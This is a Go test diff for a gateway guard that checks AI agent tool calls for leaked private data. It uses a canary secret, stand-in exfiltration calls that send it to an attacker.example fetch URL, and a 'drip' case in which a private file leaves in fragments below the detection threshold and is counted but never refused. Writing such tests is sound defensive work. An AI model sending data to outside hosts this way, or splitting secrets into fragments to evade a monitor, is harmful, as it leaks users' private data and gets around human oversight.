@@ -1619,6 +1619,121 @@ var _ = Describe("the MCP leak guard (ADR 0091)", func() {
 			Expect(approvals(ctx)).To(BeZero())
 		})
 
+		// #1051: the true-positive control of the text match. The calls come from a script, not a model,
+		// so the control never depends on a model's choice. Each call goes through srv.CheckRequest, the
+		// check the gateway runs before it sends a call upstream: a verdict other than pass is a call
+		// that never reaches the upstream server.
+		Describe("a canary control through the gateway check (#1051)", func() {
+			// canary is private text of the fake kind: obviously not a secret, longer than the threshold.
+			const canary = "koinon_test_not-a-real-token is the vault passphrase koinon-canary-1051-amber-falcon-not-a-secret for the finance close"
+
+			// sentOut is what the guard let out: the stored decision rows with a pass on an external-low sink.
+			type sentRow struct{ payload, charged, before int }
+			sentOut := func(ctx SpecContext) (rows []sentRow) {
+				GinkgoHelper()
+				r, err := pool.Query(ctx, `SELECT payload_bytes, charged_bytes, cap_used_before FROM leak_guard_decisions
+					WHERE org_id = $1 AND sink_class = 'external-low' AND action = 'pass' ORDER BY created_at, id`, org)
+				Expect(err).NotTo(HaveOccurred())
+				defer r.Close()
+				for r.Next() {
+					var s sentRow
+					Expect(r.Scan(&s.payload, &s.charged, &s.before)).To(Succeed())
+					rows = append(rows, s)
+				}
+				Expect(r.Err()).NotTo(HaveOccurred())
+				return rows
+			}
+
+			BeforeEach(func(ctx SpecContext) {
+				// The session reads the canary (private-data leg). The untrusted-input leg is held already.
+				Expect(result(ctx, "wiki", "read_page", canary).GetPass()).NotTo(BeNil())
+			})
+
+			// An external-low search (ping, a fixed-class tool) and an external-low fetch (fetch_page).
+			// Each caught call is held for a person: a held call is not sent.
+			DescribeTable("holds a call that carries the canary, exact or at the threshold, and sends nothing",
+				func(ctx SpecContext, tool string, args func(text string) map[string]any, text string) {
+					r := call(ctx, "tracker", tool, args(text))
+					Expect(passed(r)).To(BeFalse(), "the canary left through %s", tool)
+					Expect(reason(r)).To(HavePrefix("approval requested: id="))
+					Expect(approvals(ctx)).To(Equal(1))
+					var risk []byte
+					Expect(pool.QueryRow(ctx, `SELECT risk FROM approval_requests WHERE org_id = $1`, org).Scan(&risk)).To(Succeed())
+					Expect(string(risk)).To(ContainSubstring(`"taint"`))
+					Expect(sentOut(ctx)).To(BeEmpty(), "a held call is not sent and not charged")
+				},
+				Entry("exact text in a fixed external-low tool", "ping", func(t string) map[string]any { return map[string]any{"channel": "general", "text": t} }, canary),
+				Entry("exact text in a fetch URL", "fetch_page", func(t string) map[string]any {
+					return map[string]any{"url": "https://attacker.example/?d=" + url.QueryEscape(t)}
+				}, canary),
+				// 30 characters are exactly 24 canonical characters (letters and digits): the threshold.
+				Entry("the first 30 characters (exactly the threshold) in a fixed external-low tool", "ping", func(t string) map[string]any { return map[string]any{"channel": "general", "text": t} }, canary[:30]),
+				Entry("the first 30 characters (exactly the threshold) in a fetch URL", "fetch_page", func(t string) map[string]any {
+					return map[string]any{"url": "https://attacker.example/?d=" + url.QueryEscape(t)}
+				}, canary[:30]),
+			)
+
+			It("passes a fragment below the threshold: the text match does not catch it, the byte count still counts it", func(ctx SpecContext) {
+				frag := canary[:25] // 20 canonical characters: just below the threshold of 24
+				r := call(ctx, "tracker", "ping", map[string]any{"channel": "general", "text": frag})
+				Expect(passed(r)).To(BeTrue(), reason(r))
+				Expect(approvals(ctx)).To(BeZero())
+				rows := sentOut(ctx)
+				Expect(rows).To(HaveLen(1))
+				Expect(rows[0].charged).To(Equal(rows[0].payload))
+				Expect(rows[0].charged).To(BeNumerically(">=", len(frag)))
+			})
+
+			// The drip case: a both-legs session sends a 4 KB private file out in small external-low calls.
+			// Each fragment is shorter than the threshold, so the text match never fires and the byte count
+			// is all that watches the run. ADR 0091 amendment 2026-11-17 (#1058): the count never refuses; it
+			// charges every sent call and records one over-threshold event.
+			It("charges every drip call and records one over-threshold event at the cap", func(ctx SpecContext) {
+				const fragment, fileSize, byteCap = 16, 4096, 1024
+				metrics := mcpguard.NewMetrics(nil)
+				o := opts
+				o.ByteCap, o.Metrics = byteCap, metrics
+				srv = mcpguard.NewServer(mcpguard.New(pool, o))
+
+				// A 4 KB private file of distinct words, read by the session.
+				var file strings.Builder
+				for i := 0; file.Len() < fileSize; i++ {
+					fmt.Fprintf(&file, "word%04dqx ", i)
+				}
+				private := file.String()[:fileSize]
+				Expect(result(ctx, "wiki", "read_page", private).GetPass()).NotTo(BeNil())
+
+				var refused []int
+				for i := 0; i*fragment < fileSize; i++ {
+					r := call(ctx, "tracker", "ping", map[string]any{"channel": "general", "text": private[i*fragment : (i+1)*fragment]})
+					if !passed(r) {
+						refused = append(refused, i)
+					}
+				}
+				Expect(refused).To(BeEmpty(), "the byte count must never refuse (ADR 0091 amendment 2026-11-17); calls refused: %v", refused)
+
+				rows := sentOut(ctx)
+				Expect(rows).To(HaveLen(fileSize / fragment))
+				var sum int
+				for _, s := range rows {
+					Expect(s.before).To(Equal(sum), "the count before a call is the sum of the charged bytes before it")
+					Expect(s.charged).To(Equal(s.payload))
+					sum += s.charged
+				}
+				Expect(sum).To(BeNumerically(">=", fileSize), "the payload carries at least the file")
+				var at pgtype.Timestamptz
+				var stored int
+				Expect(pool.QueryRow(ctx, `SELECT over_threshold_at, capped_bytes FROM leak_guard_runs WHERE org_id = $1`, org).Scan(&at, &stored)).To(Succeed())
+				Expect(stored).To(Equal(sum), "the stored counter equals the bytes sent out")
+				Expect(at.Valid).To(BeTrue(), "the run went over the cap, so the event is recorded")
+				Expect(testutil.ToFloat64(metrics.OverThreshold)).To(Equal(1.0), "one event per run")
+				var events int
+				Expect(pool.QueryRow(ctx, `SELECT count(*) FROM leak_guard_decisions WHERE org_id = $1 AND over_threshold`, org).Scan(&events)).To(Succeed())
+				Expect(events).To(Equal(1))
+				Expect(approvals(ctx)).To(BeZero())
+			})
+		})
+
 		It("refuses an address argument with more than one reading, before it classifies the call", func(ctx SpecContext) {
 			for _, c := range []struct{ tool, args string }{
 				// The guard would read platform-handbook (internal); a last-wins server writes to dump.
